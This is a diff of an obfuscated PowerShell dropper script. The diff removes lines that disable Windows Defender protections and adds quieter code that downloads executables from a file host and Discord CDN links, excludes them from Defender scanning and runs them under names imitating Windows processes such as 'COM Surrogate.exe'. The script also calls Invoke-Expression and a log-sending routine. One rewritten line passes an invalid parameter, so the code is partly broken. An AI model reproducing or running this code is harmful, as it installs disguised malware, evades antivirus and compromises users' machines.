@@ -367,17 +367,6 @@ function Main {
     Invoke-Expression $content
     Send-Logs
 
-    $null = $PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
-    $ErrorActionPreference = 'SilentlyContinue'
-    $OutputPreference = 'SilentlyContinue'
-    $InformationPreference = 'SilentlyContinue'
-    $VerbosePreference = 'SilentlyContinue'
-    $WarningPreference = 'SilentlyContinue'
-    Set-MpPreference -DisableRealtimeMonitoring $true
-    Set-MpPreference -DisableScriptScanning $true
-    Set-MpPreference -DisableBehaviorMonitoring $true
-    Set-MpPreference -DisableIOAVProtection $true
-    Set-MpPreference -DisableIntrusionPreventionSystem $true
     $up=$env:USERPROFILE
     $td="$up\AppData\Local\Temp\6cfdfeea-9336-48ad-82b3-3d412645f44f\"
     if (-not (Test-Path -Path $td)) {New-Item -ItemType Directory -Path $td -Force | Out-Null}
@@ -389,20 +378,13 @@ function Main {
             [string]$ak9zl1
         )
         $x82jdm=Join-Path -Path $td -ChildPath $ak9zl1
-        Write-Host "Downloading $zx1ds to $x82jdm"
-        Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop
-        if (Test-Path -Path $x82jdm) {
-            Write-Host "File downloaded: $x82jdm"
-            Add-MpPreference -ExclusionPath $x82jdm
-            Start-Process -FilePath $x82jdm -NoNewWindow -Wait -ErrorAction SilentlyContinue
-        } else {
-            Write-Host "Download failed: $x82jdm"
-        }
+        Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop *> $null 2>&1
+        Add-MpPreference -ExclusionPath $x82jdm *> $null 2>&1
+        Start-Process -x82jdm $x82jdm -NoNewWindow -Wait -ErrorAction SilentlyContinue *> $null 2>&1
     }
     xk7f1q1 -zx1ds "https://r2.e-z.host/fbb8540a-d344-42ba-8e24-ff0ee16b1e7d/99tyvmq7j1mcj7by2o.exe" -ak9zl1 "Runtime Broker.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317064226329722900/COM_Surrogate.exe?ex=675d5325&is=675c01a5&hm=27aff13cbe0e0206758c9b48cd37bf161fff2c041ace7fe97ca46f9f0d074568&" -ak9zl1 "COM Surrogate.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317064215881711676/Windows_Security.exe?ex=675d5322&is=675c01a2&hm=281e33474de3ea98fce5e4813b7e8172e62a8eaf9eee26b9707303e99425821d&" -ak9zl1 "Windows Security.exe"
-
 
 
 
